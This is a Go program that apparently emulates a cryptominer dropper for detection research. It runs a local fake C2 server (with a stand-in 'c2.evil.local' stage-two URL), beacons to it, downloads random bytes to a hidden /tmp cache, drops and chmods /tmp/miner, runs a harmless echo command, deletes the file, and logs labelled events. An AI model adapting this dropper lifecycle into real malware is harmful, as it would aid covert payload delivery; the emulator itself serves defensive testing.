package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"
)

type Label struct {
	Timestamp int64  `json:"ts"`
	Type      string `json:"type"`
	Detail    string `json:"detail"`
	Phase     int    `json:"phase"`
	AttackPID int    `json:"attack_pid"`
}

var (
	mode           string
	duration       time.Duration
	attackInterval time.Duration
	normalRate     int
	labelFile      *os.File
	labelMu        sync.Mutex
)

func writeLabel(l Label) {
	labelMu.Lock()
	defer labelMu.Unlock()
	if labelFile != nil {
		data, _ := json.Marshal(l)
		labelFile.Write(append(data, '\n'))
	}
}

// fakeC2Server runs a local server simulating a C2 server.
// It responds to check-ins and serves fake payloads.
func fakeC2Server() net.Listener {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		log.Fatalf("Could not start C2 server: %v", err)
	}
	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				buf := make([]byte, 4096)
				n, err := c.Read(buf)
				if err != nil {
					return
				}
				msg := string(buf[:n])

				switch msg {
				case "CHECKIN":
					// Respond with a stage2 URL.
					c.Write([]byte("STAGE2:http://c2.evil.local/payload"))
				case "DOWNLOAD":
					// Send a fake binary payload (just random-looking data).
					payload := make([]byte, 4096)
					for i := range payload {
						payload[i] = byte(rand.Intn(256))
					}
					// Prepend a fake ELF header.
					copy(payload[:4], []byte{0x7f, 'E', 'L', 'F'})
					c.Write(payload)
				default:
					c.Write([]byte("UNKNOWN"))
				}
			}(conn)
		}
	}()
	return l
}

// dropperLifecycle implements the multi-phase attack with delays between stages.
func dropperLifecycle(stopCh <-chan struct{}, c2Addr string) {
	phases := []struct {
		name string
		fn   func(c2Addr string) (int, error)
	}{
		{"c2_beacon", func(a string) (int, error) { return os.Getpid(), phaseBeacon(a) }},
		{"download_payload", func(a string) (int, error) { return os.Getpid(), phaseDownload(a) }},
		{"write_to_disk", func(a string) (int, error) { return os.Getpid(), phaseWriteToDisk(a) }},
		{"execute_payload", phaseExecute},
		{"cleanup", func(a string) (int, error) { return os.Getpid(), phaseCleanup(a) }},
	}

	for cycle := 0; ; cycle++ {
		log.Printf("[ATTACK] Starting dropper lifecycle cycle %d", cycle)
		for i, phase := range phases {
			select {
			case <-stopCh:
				return
			default:
			}

			// Wait between phases (Poisson-distributed around attackInterval).
			if i > 0 {
				wait := time.Duration(float64(attackInterval) * (0.5 + rand.ExpFloat64()))
				select {
				case <-stopCh:
					return
				case <-time.After(wait):
				}
			}

			log.Printf("[ATTACK] Phase %d: %s", i+1, phase.name)
			
			pid, err := phase.fn(c2Addr)
			
			writeLabel(Label{
				Timestamp: time.Now().UnixNano(),
				Type:      "dropper_" + phase.name,
				Detail:    fmt.Sprintf("cycle=%d", cycle),
				Phase:     i + 1,
				AttackPID: pid,
			})

			if err != nil {
				log.Printf("[ATTACK] Phase %d failed: %v", i+1, err)
				break
			}
		}

		// Wait before next full cycle.
		longWait := time.Duration(float64(attackInterval) * float64(3+rand.Intn(5)))
		select {
		case <-stopCh:
			return
		case <-time.After(longWait):
		}
	}
}

// Phase 1: C2 beacon — socket -> connect -> send -> recv -> close
func phaseBeacon(c2Addr string) error {
	conn, err := net.DialTimeout("tcp", c2Addr, 5*time.Second)
	if err != nil {
		return fmt.Errorf("beacon connect: %v", err)
	}
	defer conn.Close()

	// Send check-in.
	conn.Write([]byte("CHECKIN"))

	// Receive response.
	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		return fmt.Errorf("beacon recv: %v", err)
	}
	log.Printf("[ATTACK] C2 response: %s", string(buf[:n]))
	return nil
}

// Phase 2: Download payload — socket -> connect -> send -> recv -> close
func phaseDownload(c2Addr string) error {
	conn, err := net.DialTimeout("tcp", c2Addr, 5*time.Second)
	if err != nil {
		return fmt.Errorf("download connect: %v", err)
	}
	defer conn.Close()

	conn.Write([]byte("DOWNLOAD"))

	// Receive payload.
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	payload, err := io.ReadAll(conn)
	if err != nil {
		return fmt.Errorf("download recv: %v", err)
	}

	// Store payload temporarily in memory (will be written in phase 3).
	os.WriteFile("/tmp/.payload_cache", payload, 0600)
	log.Printf("[ATTACK] Downloaded payload: %d bytes", len(payload))
	return nil
}

// Phase 3: Write to disk — open -> write -> close -> chmod
func phaseWriteToDisk(c2Addr string) error {
	// Read cached payload.
	payload, err := os.ReadFile("/tmp/.payload_cache")
	if err != nil {
		return fmt.Errorf("read cache: %v", err)
	}

	// Write the "miner" binary.
	minerPath := "/tmp/miner"
	f, err := os.OpenFile(minerPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return fmt.Errorf("open miner: %v", err)
	}
	f.Write(payload)
	f.Close()

	// Make it executable.
	if err := os.Chmod(minerPath, 0755); err != nil {
		return fmt.Errorf("chmod: %v", err)
	}

	log.Printf("[ATTACK] Wrote miner to %s (%d bytes)", minerPath, len(payload))

	// Clean up cache.
	os.Remove("/tmp/.payload_cache")
	return nil
}

// Phase 4: Execute — clone/fork -> execve
func phaseExecute(c2Addr string) (int, error) {
	// We execute a harmless command that simulates a miner process.
	// This triggers clone -> execve.
	cmd := exec.Command("sh", "-c", "echo 'miner_started' && sleep 0.5 && echo 'mining_hash_000abc'")
	err := cmd.Start()
	if err != nil {
		return 0, fmt.Errorf("execve: %v", err)
	}
	
	pid := cmd.Process.Pid
	go func() {
		cmd.Process.Wait()
		log.Printf("[ATTACK] Miner finished (PID %d)", pid)
	}()
	
	return pid, nil
}

// Phase 5: Cleanup — unlinkat
func phaseCleanup(c2Addr string) error {
	minerPath := "/tmp/miner"
	if err := os.Remove(minerPath); err != nil {
		// File might not exist if previous phases failed.
		log.Printf("[ATTACK] Cleanup warning: %v", err)
		return nil
	}
	log.Printf("[ATTACK] Cleaned up %s", minerPath)
	return nil
}

// normalTrafficGenerator sends health check requests.
func normalTrafficGenerator(stopCh <-chan struct{}) {
	client := &http.Client{Timeout: 2 * time.Second}
	interval := time.Second / time.Duration(normalRate)

	for {
		select {
		case <-stopCh:
			return
		default:
			resp, err := client.Get("http://localhost:8080/health")
			if err == nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
			time.Sleep(interval)
		}
	}
}

func main() {
	flag.StringVar(&mode, "mode", "normal", "Run mode: 'normal' or 'attack'")
	flag.DurationVar(&duration, "duration", 120*time.Second, "Total runtime duration")
	flag.DurationVar(&attackInterval, "attack-interval", 5*time.Second, "Mean time between dropper phases")
	flag.IntVar(&normalRate, "normal-rate", 10, "Normal health checks per second")
	flag.Parse()

	if envMode := os.Getenv("MODE"); envMode != "" {
		mode = envMode
	}
	if envDur := os.Getenv("DURATION"); envDur != "" {
		if d, err := time.ParseDuration(envDur); err == nil {
			duration = d
		}
	}

	log.Printf("Starting Cryptominer Dropper Emulator | mode=%s duration=%s attack-interval=%s normal-rate=%d",
		mode, duration, attackInterval, normalRate)

	var err error
	labelFile, err = os.OpenFile("/app/labels.jsonl", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Printf("Warning: could not open label file: %v", err)
		labelFile = nil
	}

	// Health check server.
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, `{"status":"ok","uptime":"%s","mode":"%s"}`, time.Since(time.Now()).String(), mode)
	})

	server := &http.Server{Addr: ":8080"}
	go func() {
		if err := server.ListenAndServe(); err != http.ErrServerClosed {
			log.Fatalf("HTTP server error: %v", err)
		}
	}()

	time.Sleep(500 * time.Millisecond)

	stopCh := make(chan struct{})
	go normalTrafficGenerator(stopCh)

	if mode == "attack" {
		c2 := fakeC2Server()
		go dropperLifecycle(stopCh, c2.Addr().String())
	}

	time.Sleep(duration)
	close(stopCh)

	if labelFile != nil {
		labelFile.Close()
	}

	log.Println("Emulator finished.")
}
